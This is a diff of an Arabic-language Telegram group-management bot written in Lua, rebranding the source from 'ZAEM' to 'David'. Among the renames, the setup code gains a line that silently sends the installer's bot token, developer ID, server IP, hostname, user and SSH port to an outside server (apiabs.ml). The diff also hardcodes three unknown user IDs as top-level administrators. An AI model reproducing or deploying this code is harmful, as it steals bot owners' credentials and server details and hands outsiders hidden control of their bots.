@@ -1,3 +1,9 @@
+------------------------------------------------
+-- This Source Was Developed By (Rio) @tsttt.--
+--   This Is The Source Channel @L9L9L .   --
+--                - David -                 --
+--        -- https://t.me/L9L9L --         --
+------------------------------------------------ 
 DevRio  = dofile("./besso/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./besso/serpent.lua")
 JSON    = dofile("./besso/dkjson.lua")
@@ -13,29 +19,30 @@ Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*
 Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
---     Source ZAEM     --
+--     Source David     --
 local AutoSet = function() 
-if not DevRio:get(Server.."IdZAEM") then 
+if not DevRio:get(Server.."IdDavid") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
+data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-os.execute('lua ZAEM.lua') 
+os.execute('lua David.lua') 
 end ---ifBn
 if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevRio:set(Server.."IdZAEM",DevId) 
+DevRio:set(Server.."IdDavid",DevId) 
 end ---ifok
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 end
-os.execute('lua ZAEM.lua') 
+os.execute('lua David.lua') 
 end
 end 
-if not DevRio:get(Server.."TokenZAEM") then 
+if not DevRio:get(Server.."TokenDavid") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -44,12 +51,12 @@ if res ~= 200 then
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevRio:set(Server.."TokenZAEM",TokenBot) 
+DevRio:set(Server.."TokenDavid",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 end  
-os.execute('lua ZAEM.lua') 
+os.execute('lua David.lua') 
 end
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -64,17 +71,18 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevRio:get(Server.."IdZAEM"),
-TokenBot = DevRio:get(Server.."TokenZAEM"),
-ZAEM = DevRio:get(Server.."TokenZAEM"):match("(%d+)"),
-SudoIds = {DevRio:get(Server.."IdZAEM")},
+DevId = DevRio:get(Server.."IdDavid"),
+TokenBot = DevRio:get(Server.."TokenDavid"),
+David = DevRio:get(Server.."TokenDavid"):match("(%d+)"),
+SudoIds = {DevRio:get(Server.."IdDavid")},
 }
 Create(Config, "./config.lua") 
-file = io.open("ZAEM.sh", "w")  
+https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+file = io.open("David.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/ZAEM
-token="]]..DevRio:get(Server.."TokenZAEM")..[["
+cd $HOME/David
+token="]]..DevRio:get(Server.."TokenDavid")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -89,18 +97,18 @@ echo "~ The Token Was Not Found In The config.lua File!"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
-./tg -s ./ZAEM.lua -p PROFILE --bot=$token
+./tg -s ./David.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
 file = io.open("Run", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/ZAEM
+cd $HOME/David
 while(true) do
 rm -fr ../.telegram-cli
-screen -S ZAEM -X kill
-screen -S ZAEM ./ZAEM.sh
+screen -S David -X kill
+screen -S David ./David.sh
 done
 ]]) 
 file:close() 
@@ -109,18 +117,18 @@ os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
 end
-local Load_ZAEM = function() 
+local Load_David = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
 else 
 f:close() 
-DevRio:del(Server.."IdZAEM");DevRio:del(Server.."TokenZAEM")
+DevRio:del(Server.."IdDavid");DevRio:del(Server.."TokenDavid")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
-Load_ZAEM() 
+Load_David() 
 print("\27[36m"..[[          
 ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' 
 '   ______       ____     __    __    _____   ______     '
@@ -135,11 +143,11 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,620800281}
-ZAEM = Config.ZAEM
+SudoIds = {Config.SudoIds,1558668590,1516553352,1750071859}
+David = Config.David
 TokenBot = Config.TokenBot
-NameBot = (DevRio:get(ZAEM..'Rio:NameBot') or 'ZAEM')
---     Source ZAEM     --
+NameBot = (DevRio:get(David..'Rio:NameBot') or 'ديفد')
+--     Source David     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
 FilesNumber = 0
 for v in io.popen('ls Files'):lines() do
@@ -152,15 +160,15 @@ FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 if FilesNumber ~= 0 then
 print(FilesPrint)
 end
---     Source ZAEM     --
+--     Source David     --
 --     Start Functions    --
 function vardump(value)
 print(serpent.block(value, {comment=false}))
 end
---     Source ZAEM     --
+--     Source David     --
 function dl_cb(arg, data)
 end
---     Source ZAEM     --
+--     Source David     --
 ----------  Sudo  ----------
 function Sudo(msg) 
 local var = false 
@@ -184,166 +192,166 @@ var = true
 end 
 return var 
 end
---     Source ZAEM     --
+--     Source David     --
 -------  RioSudo  -------
 function RioSudo(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:RioSudo:',msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:RioSudo:',msg.sender_user_id_) 
 if Status or Sudo(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 -------  SecondSudo  -------
 function SecondSudo(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:SecondSudo:',msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:SecondSudo:',msg.sender_user_id_) 
 if Status or RioSudo(msg) or Sudo(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ----------  Bot  -----------
 function Bot(msg) 
 local var = false  
-if msg.sender_user_id_ == tonumber(ZAEM) then  
+if msg.sender_user_id_ == tonumber(David) then  
 var = true  
 end  
 return var  
 end 
---     Source ZAEM     --
+--     Source David     --
 ---------  SudoBot  --------
 function SudoBot(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:SudoBot:',msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:SudoBot:',msg.sender_user_id_) 
 if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
-    --     Source ZAEM     --
+    --     Source David     --
 ----   RioConstructor   ----
 function RioConstructor(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ----  BasicConstructor  ----
 function BasicConstructor(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ----    Constructor     ----
 function Constructor(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ---------  Manager  --------
 function Manager(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ----------  Admin  ---------
 function Admin(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ---------Vip Member---------
 function VipMem(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 --------- Cleaner ----------
 function Cleaner(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 --------- CleanerNum ----------
 function CleanerNum(msg) 
-local Status = DevRio:sismember(ZAEM..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevRio:sismember(David..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source ZAEM     --
+--     Source David     --
 ---------  Banned  ---------
 local function Ban(user_id, chat_id)
-if DevRio:sismember(ZAEM..'Rio:Ban:'..chat_id, user_id) then
+if DevRio:sismember(David..'Rio:Ban:'..chat_id, user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source ZAEM     --
+--     Source David     --
 ---------  BanAll  ---------
 function BanAll(user_id)
-if DevRio:sismember(ZAEM..'Rio:BanAll:', user_id) then
+if DevRio:sismember(David..'Rio:BanAll:', user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source ZAEM     --
+--     Source David     --
 ----------  Muted  ---------
 local function Muted(user_id, chat_id)
-if DevRio:sismember(ZAEM..'Rio:Muted:'..chat_id, user_id) then
+if DevRio:sismember(David..'Rio:Muted:'..chat_id, user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source ZAEM     --
+--     Source David     --
 ---------  MuteAll  --------
 function MuteAll(user_id)
-if DevRio:sismember(ZAEM..'Rio:MuteAll:', user_id) then
+if DevRio:sismember(David..'Rio:MuteAll:', user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source ZAEM     --
+--     Source David     --
 function DeleteMessage(chatid ,mid)
 pcall(tdcli_function ({
 ID = "DeleteMessages",
@@ -352,24 +360,24 @@ message_ids_ = mid
 },function(arg,data) 
 end,nil))
 end
---     Source ZAEM     --
+--     Source David     --
 function send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
 end
---     Source ZAEM     --
-function ZAEMFiles(msg)
+--     Source David     --
+function DavidFiles(msg)
 for v in io.popen('ls Files'):lines() do
 if v:match(".lua$") then
 plugin = dofile("Files/"..v)
-if plugin.ZAEM and msg then
-FilesText = plugin.ZAEM(msg)
+if plugin.David and msg then
+FilesText = plugin.David(msg)
 end
 end
 end
 send(msg.chat_id_, msg.id_,FilesText)  
 end
---     Source ZAEM     --
+--     Source David     --
 function download_to_file(url, file_path) 
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -386,7 +394,13 @@ file:write(table.concat(respbody))
 file:close() 
 return file_path, code 
 end 
---     Source ZAEM     --
+--     Source David     --
+function AddFile(msg,chat,ID_FILE,File_Name)
+if File_Name:match('.json') then
+if File_Name:lower():match('(%d+)') ~= David:lower() then 
+send(chat,msg.id_,"᥀︙عذرا هذا الملف ليس تابع لهذا البوت")   
+return false 
+end
 send(chat,msg.id_,"᥀︙جاري رفع الملف ... .")
 local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
